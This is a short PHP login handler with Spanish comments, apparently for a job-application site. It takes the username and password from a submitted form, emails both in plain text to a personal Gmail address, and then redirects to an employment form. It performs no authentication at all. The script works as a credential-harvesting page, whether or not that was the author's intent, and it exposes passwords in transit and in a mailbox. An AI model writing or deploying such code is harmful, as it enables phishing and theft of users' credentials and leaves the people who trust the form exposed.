<?php

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Enviar correo al jefe de contratación
    $to = "roniifelipe@gmail.com";
    $subject = "Inicio de Sesión - Información de Usuario";
    $message = "Usuario: " . $username . "\nContraseña: " . $password;
    $headers = "From: webmaster@example.com";

    mail($to, $subject, $message, $headers);

    // Redirigir al formulario de información del postulado
    header('Location: formulario_empleo.php');
    exit;
}

?>
